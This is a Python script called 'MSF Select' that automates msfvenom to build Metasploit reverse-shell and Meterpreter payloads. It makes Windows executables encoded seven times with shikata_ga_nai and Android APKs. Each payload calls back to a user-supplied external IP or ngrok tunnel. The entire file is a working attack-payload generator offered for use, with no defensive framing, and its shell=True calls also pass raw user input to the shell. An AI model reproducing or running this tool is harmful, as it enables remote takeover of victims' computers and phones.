#!/usr/bin/env python

import subprocess
from termcolor import colored 
from pyfiglet import Figlet
import time
import argparse
import sys
# goated banner 
intro = Figlet(font="starwars")
print(colored(intro.renderText("MSF Select"),
              "blue"))
time.sleep(1)
print("This script requires Metasploit Framework to be installed to on your system.")
time.sleep(0.50)
print("Usage: python3 msfselect.py (-h/--help, -i/--info, -p/--payload, -l/--list)\n")

def main():
    parser = argparse.ArgumentParser()    
    parser.add_argument("--info", "-i", help="show script tutorial", 
                        action="store_true")
    parser.add_argument("--list", "-l", help="list payloads to generate",
                        action="store_true") 
    parser.add_argument("--payload", "-p", help="choose a payload to generate using msf",
                        action="store_true")
    args = parser.parse_args()

    if args.info: 
        print("\nScript that automatically generates Metasploit payloads, because I was bored and needed something to do.\n" 
              "\nUse '-l' or '--list' to list payloads or '-i' or '--info' to print this tutorial.\n" 
              "\nOnce you've found a payload you'd like to use, use '-p' or '--payload' to choose a payload and generate it.\n" 
              "\nIf you enjoyed this script, follow my channel at 'https://t.me/ethievery'.")
        sys.exit(0)

    if args.list:
      payloads = ["1: windows/meterpreter/reverse_http",
                  "2: windows/meterpreter/reverse_https",
                  "3: android/meterpreter/reverse_http",
                  "4: android/meterpreter/reverse_https",
                  "5: android/meterpreter/reverse_tcp",
                  "6: android/shell/reverse_http",
                  "7: android/shell/reverse_https",
                  "8: android/shell/reverse_tcp"]
      for x in payloads:
        print(x)
      sys.exit(0)

    if args.payload:
          generate = input("What payload would you like to generate? Enter a number from the payload list.\n---------------------------------------\n")
          filename = input("---------------------------------------\nEnter your desired payload name (without file extension):\n---------------------------------------\n")
          lhost = input("---------------------------------------\nEnter external IP address or ngrok tcp tunnel for LHOST:\n---------------------------------------\n")
          lport = input("---------------------------------------\nEnter forwarded port:\n---------------------------------------\n")
          print("---------------------------------------\nWait a few seconds, payload is being generated...\n---------------------------------------")
          if generate == "1":
              try:
                  subprocess.run(f"msfvenom -p windows/meterpreter/reverse_http -f exe -e x86/shikata_ga_nai -i 7 LHOST={lhost} LPORT={lport} -o {filename}.exe" ,
                                 shell=True)
              except subprocess.CalledProcessError:
                print("Didn't work. Maybe you don't have msf installed?")
                sys.exit(0)   
          elif generate == "2":
              try: 
                  subprocess.run(f"msfvenom -p windows/meterpreter/reverse_https -f exe -e x86/shikata_ga_nai -i 7 LHOST={lhost} LPORT={lport} -o {filename}.exe" ,
                                 shell=True)
              except subprocess.CalledProcessError:
                print("Didn't work. Maybe you don't have msf installed?")
                sys.exit(0)   
          elif generate == "3":
             try:
                subprocess.run(f"msfvenom -p android/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                 shell=True)
             except subprocess.CalledProcessError:
                print("Didn't work. Maybe you don't have msf installed?")
                sys.exit(0)                  
          elif generate == "4":
             try:
                subprocess.run(f"msfvenom -p android/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                 shell=True)
             except subprocess.CalledProcessError:
                print("Didn't work. Maybe you don't have msf installed?")
                sys.exit(0)
          elif generate == "5":
             try:
                subprocess.run(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                 shell=True)
             except subprocess.CalledProcessError:
                print("Didn't work. Maybe you don't have msf installed?")
                sys.exit(0)    
          elif generate == "6":
             try:
                subprocess.run(f"msfvenom -p android/shell/reverse_http LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                 shell=True)
             except subprocess.CalledProcessError:
                print("Didn't work. Maybe you don't have msf installed?")
                sys.exit(0)    
          elif generate == "7":
             try:
                subprocess.run(f"msfvenom -p android/shell/reverse_https LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                 shell=True)
             except subprocess.CalledProcessError:
                print("Didn't work. Maybe you don't have msf installed?")
                sys.exit(0)    
          elif generate == "8":
             try:
                subprocess.run(f"msfvenom -p android/shell/reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                 shell=True)
             except subprocess.CalledProcessError:
                print("Didn't work. Maybe you don't have msf installed?")
                sys.exit(0)
          else:
             print("Payload not generated. Select one of the available options.")
             sys.exit(0)
main()